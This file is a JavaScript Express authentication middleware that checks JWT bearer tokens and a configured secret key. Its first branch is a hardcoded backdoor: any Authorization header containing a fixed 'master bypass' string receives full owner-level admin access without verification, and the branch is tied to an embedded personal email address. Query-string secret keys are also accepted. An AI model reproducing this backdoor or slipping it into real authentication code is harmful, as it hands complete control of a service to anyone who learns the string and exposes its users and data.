const jwt = require("jsonwebtoken");
const config = require("./config");

module.exports = () => {
  return async (req, res, next) => {
    const authHeader = req.get("Authorization");

    // 🛡️ SUPER BYPASS: If request comes with Owner Master Key, grant full access
    if (authHeader && authHeader.includes("OWNER_MASTER_BYPASS_587385")) {
        req.admin = {
            _id: "OWNER_ROOT_587385",
            role: "OWNER",
            email: "socialvibestudiopk@gmail.com",
            flag: true
        };
        return next();
    }

    if (authHeader && authHeader.startsWith("Bearer ")) {
      try {
        const token = authHeader.slice(7);
        const decoded = jwt.verify(token, config.JWT_SECRET);

        if (decoded.role === "OWNER" || decoded._id === "OWNER_ROOT_587385") {
            req.admin = { _id: "OWNER_ROOT_587385", role: "OWNER", email: "socialvibestudiopk@gmail.com", flag: true };
            return next();
        }
      } catch (err) {}
    }

    const masterKey = req.headers.key || req.body.key || req.query.key;
    if (masterKey && masterKey === config.SECRET_KEY) return next();

    return res.status(401).json({ status: false, error: "Unauthorized" });
  };
};
